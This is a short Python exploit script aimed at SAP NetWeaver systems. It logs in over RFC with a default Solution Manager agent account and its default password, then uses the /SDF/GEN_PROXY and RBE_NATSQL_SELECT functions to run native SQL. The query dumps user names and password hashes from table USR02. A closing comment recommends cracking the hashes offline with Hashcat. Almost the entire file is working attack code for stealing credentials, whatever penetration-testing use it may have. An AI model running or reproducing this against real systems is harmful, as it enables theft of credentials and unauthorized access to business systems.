#!/usr/bin/python

import sapnwrfc
import re
from pprint import pprint

default_host = '192.168.233.131' ;    var_host = raw_input('Host: [%s]' % default_host) ;            var_host = var_host or default_host
default_sysnr = '00' ;          var_sysnr = raw_input('System number: [%s]' % default_sysnr) ; var_sysnr = var_sysnr or default_sysnr
default_client = '001' ;        var_client = raw_input('Client: [%s]' % default_client) ;      var_client = var_client or default_client
default_user = 'SMDAGENT_SSM' ; var_user = raw_input('User: [%s]' % default_user) ;            var_user = var_user or default_user
default_pw = 'init1234' ;       var_pw = raw_input('Password: [%s]' % default_pw) ;            var_pw = var_pw or default_pw
print 'Trying to read SAP password hashes...'

sapnwrfc.base.load_config()
conn = sapnwrfc.base.rfc_connect({'ashost':var_host, 'sysnr':var_sysnr, 'client':var_client, 'user':var_user, 'passwd':var_pw, 'lang':'EN' })

### Read USR02 via /SDF/GEN_PROXY
fa = conn.discover("/SDF/GEN_PROXY")
a = fa.create_function_call()
a.INPUT( [{ 'FB_NAME': "/SDF/RBE_NATSQL_SELECT", 'PARAMETERS': [{ 'PARAM': "MAX_ROWS", 'VALUE': "999" }, { 'PARAM': "SQL_TEXT", 'VALUE': "SELECT BNAME, BCODE FROM USR02" }] }] )
a.invoke()
z = a.RESULT.value
conn.close()
pprint (z) 

# when executed succesfully you can retrieve the PW hashes from table USR02 and bruteforce them offline with Hashcat
